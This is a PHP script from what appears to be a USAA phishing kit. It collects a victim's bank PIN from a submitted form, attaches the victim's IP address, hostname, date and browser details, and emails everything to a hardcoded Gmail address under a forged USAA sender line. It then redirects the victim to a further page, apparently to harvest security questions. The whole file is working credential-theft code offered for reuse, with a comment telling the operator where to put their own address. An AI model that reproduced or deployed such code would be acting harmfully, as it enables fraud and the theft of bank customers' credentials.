<?php 
$Ok= "sheriffyoung001@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "================== PIN ==================\n";
$fuck .= "P.i.N : ".$_POST['pin1']."\n";
$fuck .= "============= [ Ip & Hostname Info ] =============\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=============+FishFlow+===========\n";
$subject = " USAA PIN $ip";
$headers = "From:  USAA <usaa@zenquel.com>";
mail($Ok,$subject,$fuck,$headers);
Header ("Location: question.php?id=usaaonline");
?>